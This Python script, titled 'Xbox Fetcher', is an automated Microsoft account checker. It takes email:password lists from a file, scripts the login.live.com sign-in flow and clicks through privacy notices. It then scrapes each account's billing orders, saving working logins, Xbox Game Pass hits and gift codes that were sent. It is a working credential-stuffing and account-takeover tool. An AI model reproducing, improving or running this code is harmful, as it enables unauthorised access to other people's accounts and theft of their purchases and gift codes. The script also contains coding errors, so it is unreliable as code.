import requests
import threading
from colorama import Fore,init
import sys,json
import json
import re, random, string,urllib.parse
import console.utils 
from console.utils import set_title
from requests_toolbelt import MultipartEncoder
from uuid import uuid4

Total = len(open("accounts.txt", "r").read().splitlines())
xbox = 0
dead = 0
chkd = 0
set_title(f"Xbox Fetcher | Success: {xbox}")
request_exceptions = (requests.exceptions.SSLError,requests.exceptions.ProxyError,requests.exceptions.Timeout)
ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
def sprint(content, status: str="c") -> None:
    if status=="y":
        colour = Fore.YELLOW
    elif status=="c":
        colour = Fore.CYAN
    elif status=="r":
        colour = Fore.RED
    elif status=="new":
        colour = Fore.LIGHTYELLOW_EX
    sys.stdout.write(
            f"{colour}{content}"
            + "\n"
            + Fore.RESET
        )    
def remove_content(file_path : str, line_to_remove : str):
    with open(file_path, 'r') as file:
        lines = file.readlines()
    lines = [line for line in lines if line.strip() != line_to_remove.strip()]
    with open(file_path, 'w') as file:
        file.writelines(lines)
def main():
    global xbox,minecraft
    accounts = open("accounts.txt", "r").read().splitlines()
    
    try:
        mscred = accounts[0].strip()
    except:
        return 'hotmail'
    
    try:
        try:
            email = mscred.split("|")[0]
            password = mscred.split("|")[1]
        except:
            email = mscred.split(":")[0]
            password = mscred.split(":")[1]
    except:
        remove_content("accounts.txt", mscred)
        return
    s = requests.session()
    headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    'Sec-Fetch-Dest': 'document',
    'Accept-Encoding': 'identity',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Sec-GPC': '1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': ua,
}

    while True:
        try:
            response = s.get('https://login.live.com/ppsecure/post.srf', headers=headers,timeout=20).text
            break
        except request_exceptions:
            continue
        except Exception as e:
            sprint(str(e),"r")
            return 'chkd'
    try:
        ppft = response.split(''''<input type="hidden" name="PPFT" id="i0327" value="''')[1].split('"')[0]
        log_url = response.split(",urlPost:'")[1].split("'")[0]
    except:
        sprint("[-] Unknown Error (Proxies probably banned)")
        return 'chkd'
    log_data = f'i13=0&login={email}&loginfmt={email}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i19=449894'
    headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://login.live.com',
    'Referer': 'https://login.live.com/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Sec-GPC': '1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': ua,
            }  
    while True:
        try:
            response = s.post(log_url,timeout=20,data=log_data,headers=headers)
            break
        except request_exceptions:
            continue
        except Exception as e:
            sprint(e,"r")
            return 'chkd'
    if 'https://privacynotice.account.microsoft.com/notice' in response.text:
        privNotifUrl = response.text.split('name="fmHF" id="fmHF" action="')[1].split('"')[0]
        corelationId = response.text.split('name="correlation_id" id="correlation_id" value="')[1].split('"')[0]
        mCode = response.text.split('type="hidden" name="code" id="code" value="')[1].split('"')[0]
        while True:
            try:
                privNotifPage = s.post(privNotifUrl,headers={
    'authority': 'privacynotice.account.microsoft.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'path' : privNotifUrl.replace('https://privacynotice.account.microsoft.com',''),
    'accept-language': 'en-US,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://login.live.com',
    'referer': 'https://login.live.com/',
    'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'cross-site',
    'sec-gpc': '1',
    'upgrade-insecure-requests': '1',
    'user-agent':ua,
},data={'correlation_id':corelationId,
        'code':mCode}).text
                break
            except:
                continue
        try:
            m = MultipartEncoder(fields={'AppName': 'ALC',
    'ClientId': privNotifPage.split("ucis.ClientId = '")[1].split("'")[0],
    'ConsentSurface': 'SISU',
    'ConsentType': 'ucsisunotice',
    'correlation_id': corelationId,
    'CountryRegion': privNotifPage.split("ucis.CountryRegion = '")[1].split("'")[0],
    'DeviceId':'' ,
    'EncryptedRequestPayload': privNotifPage.split("ucis.EncryptedRequestPayload = '")[1].split("'")[0]
    ,'FormFactor': 'Desktop',
    'InitVector':privNotifPage.split("ucis.InitVector = '")[1].split("'")[0],
    'Market': privNotifPage.split("ucis.Market = '")[1].split("'")[0],
    'ModelType': 'ucsisunotice',
    'ModelVersion': '1.11',
    'NoticeId': privNotifPage.split("ucis.NoticeId = '")[1].split("'")[0],
    'Platform': 'Web',
    'UserId': privNotifPage.split("ucis.UserId = '")[1].split("'")[0],
    'UserVersion': '1'},boundary='----WebKitFormBoundary' \
            + ''.join(random.sample(string.ascii_letters + string.digits, 16)))
        except:
            return 'Fraud Detected.'
        headers = {
    'authority': 'privacynotice.account.microsoft.com',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.7',
    'content-type': m.content_type,
    'origin': 'https://privacynotice.account.microsoft.com',
    'referer': privNotifUrl,
    'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'sec-gpc': '1',
    'user-agent': ua,
}

        while True:
            try:
                response = s.post('https://privacynotice.account.microsoft.com/recordnotice', headers=headers, data=m)
                break
            except:
                continue

        while True:
            try:
                response = s.get(urllib.parse.unquote(privNotifUrl.split('notice?ru=')[1]),headers={
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.6',
        'Connection': 'keep-alive',
        'Referer': 'https://privacynotice.account.microsoft.com/',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-User': '?1',
        'Sec-GPC': '1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': ua,
        'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    })
                break
            except:
                continue


    try:
        ppft2 = re.findall("sFT:'(.+?(?=\'))", response.text)[0],
        url_log2 = re.findall("urlPost:'(.+?(?=\'))", response.text)[0]
    except:
        dead +=1
        chkd += 1
        sprint("[-] Invalid microsoft acc!","c")
        remove_content("accounts.txt",mscred)
        return 'chkd'


    log_data2 = {
    "LoginOptions": "3",
    "type": "28",
    "ctx": "",
    "hpgrequestid": "",
    "PPFT": ppft2,
    "i19": "19130"
}
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://login.live.com',
        'Referer': log_url,
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Sec-GPC': '1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': ua,
    }
    while True:
        try:
            midAuth2 = s.post(url_log2,timeout=20,data=log_data2,headers=headers).text
            break
        except request_exceptions:
            continue
        except Exception as e:
            sprint(e,"r")
            return 'chkd'
    while "fmHF" in midAuth2:
        midAuth2 = {
"fmHF": midAuth2.split('name="fmHF" id="fmHF" action="')[1].split('"')[0],
"pprid": midAuth2.split('type="hidden" name="pprid" id="pprid" value="')[1].split('"')[0],
"nap": midAuth2.split('type="hidden" name="NAP" id="NAP" value="')[1].split('"')[0],
"anon": midAuth2.split('type="hidden" name="ANON" id="ANON" value="')[1].split('"')[0],
"t": midAuth2.split('<input type="hidden" name="t" id="t" value="')[1].split('"')[0]} 
        data = {
    'pprid': midAuth2["fmHF"],
    'NAP': midAuth2['nap'],
    'ANON': midAuth2['anon'],
    't': midAuth2['t'],
}
        loda_lund = midAuth2['fmHF']
        while True:
            try:
                midAuth2 = s.post(loda_lund,data=data,headers={
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.8',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',

    'Origin': 'https://login.live.com',
    'Referer': 'https://login.live.com/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'cross-site',
    'Sec-GPC': '1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': ua,
}).text     
                break
            except request_exceptions:
                continue
            except Exception as e:
                sprint(e,"r")
                return 'chkd'
    headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.6',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Referer': 'https://login.live.com/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'cross-site',
    'Sec-GPC': '1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': ua,
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    params = {
    'fref': 'home.drawers.payment-options.manage-payment',
    'refd': 'account.microsoft.com',
}
    while True:
        try:
            response = s.get('https://account.microsoft.com/billing/payments', params=params, headers=headers)
            break
        except request_exceptions:continue
        except Exception as e:
            sprint(e,"r")
            return 'chkd'
    try: 
        vrf_token = response.text.split('<input name="__RequestVerificationToken" type="hidden" value="')[1].split('"')[0]
    except:
        try:
            fuck = response.text.split('<meta name="description" content="')[1].split('"')[0]
            if fuck == "Try again later":
                print(Fore.LIGHTYELLOW_EX +f"[-] Microsoft Server Down: Please {fuck}")
                return 'exit'
        except:
            return 'fuck you mother fucker'
    
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip,deflate,br',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Host': 'account.microsoft.com',
        'MS-CV': 'XeULpZy1H023MIm9.7.51',
        'Referer': response.url,
        'Origin': 'https://login.live.com',
        'Referer': log_url,
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Sec-GPC': '1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': ua,
        '__RequestVerificationToken': vrf_token,
    }
    params = {
        'period': 'ThreeMonths',
        'orderTypeFilter': 'All',
        'filterChangeCount': '0',
        'isInD365Orders': True,
        'isPiDetailsRequired': True,
        'timeZoneOffsetMinutes': '-330',
    }
    json_data = s.get("https://account.microsoft.com/billing/orders/list", params=params, headers=headers).json()
    xboxchkd = 0

    try:
        total_orders = json_data['orders']
        orders_count = len(total_orders)
        print(Fore.BLUE + f"[+] Total {orders_count} Found: {email}")
        chkd += 1

        processed_emails = set()

        for index, order in enumerate(total_orders, start=1):
            for item_index, item in enumerate(order['items'], start=1):
                order_name = item['localTitle']
                order_status = item['itemState']
                print(Fore.CYAN + f"[{index}.{item_index}] Product Name: {order_name}")
                print(Fore.LIGHTCYAN_EX + f"[{index}.{item_index}] Successfully: {order_status}")

                if "Xbox Game Pass Ultimate" in order_name and "December" in order['localSubmittedDate']:
                    xboxchkd += 1

                elif not "Xbox Game Pass Ultimate" in order_name and "GiftSent" in order_status:
                    giftcodeother = item['giftCode']
                    ipother = order['address']['regionName']
                    open("other.txt", "a").write(giftcodeother + " : " + ipother + " : " + order_name + "\n")

            
       if orders_count < 8 and orders_count > 1:
            for order in total_orders:
                for item in order['items']:
                    if "AuthorizationFailed" not in item['itemState'] or "Failed" not in item['itemState'] or "Redeemed" not in item['itemState']:
                        processed_emails.add(mscred)

        for email in processed_emails:
            open("working_accounts.txt", "a").write(email + "\n")
    except KeyError:
        print(total_orders)
        print(f"[-] No Orders Found. ")
        return 'exit'
    except Exception as e:
        print("[-] An error occurred:", e)
        return 'exit'
                    
    if orders_count ==0:
        pass 
    elif not "Xbox Game Pass Ultimate" in order_name and not "GiftSent" in order_status:
        dead +=1 
    
    if xboxchkd > 0:
        xbox +=1
        open("success.txt", "a").write(mscred+"\n")

    if orders_count == 0:
        dead +=1

    set_title(f"Xbox Fetcher | Success: {xbox}")
    remove_content("accounts.txt", mscred)
    if orders_count > 0:
        return 'done'


init()  
count = 0
if __name__ == "__main__":
    accounts = open("accounts.txt", "r").read().splitlines()
    while len(accounts) > 0:
        gg = main()  
        if gg == "exit":
            sys.exit()
        elif gg == "hotmail":
            sprint("[-] Out of Hotmails", "y")
            break
        else:
            continue
